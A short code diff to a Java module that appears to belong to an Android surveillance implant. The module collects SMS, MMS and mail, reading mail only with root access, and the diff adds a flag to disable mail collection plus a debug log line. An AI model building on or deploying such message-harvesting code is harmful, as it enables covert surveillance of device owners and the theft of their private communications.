@@ -119,7 +119,11 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		// {"mms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-28 09:40:05"}},"sms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-01 00:00:00"}},"mail":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2011-02-01 00:00:00"}},"module":"messages"}
 		try {
 
-			mailEnabled = Status.self().haveRoot() && readJson(ID_MAIL, Messages.getString("18_1"), conf, config);
+			if(Cfg.ENABLE_MAIL_MODULE){
+				mailEnabled = Status.self().haveRoot() && readJson(ID_MAIL, Messages.getString("18_1"), conf, config);
+			}else{
+				mailEnabled = false;
+			}
 			smsEnabled = readJson(ID_SMS, Messages.getString("18_7"), conf, config);
 			mmsEnabled = readJson(ID_MMS, Messages.getString("18_9"), conf, config);
 
@@ -223,9 +227,8 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	@Override
 	public void actualStart() {
 
-		obs = new ProcessMailObserver();
-
 		if (mailEnabled) {
+			obs = new ProcessMailObserver();
 			initMail();
 			ListenerProcess.self().attach(obs);
 		}
@@ -445,6 +448,10 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 					// i_2=messages
 					// Messages.getString("i_2")
 					int newLastId = (int) helper.traverseRecords("messages", visitor);
+					
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (readHistoricMail) finished, newLastId: " + newLastId);
+					}
 
 					if (newLastId > lastId) {
 						updateMarkupMail(mailstore, newLastId, true);
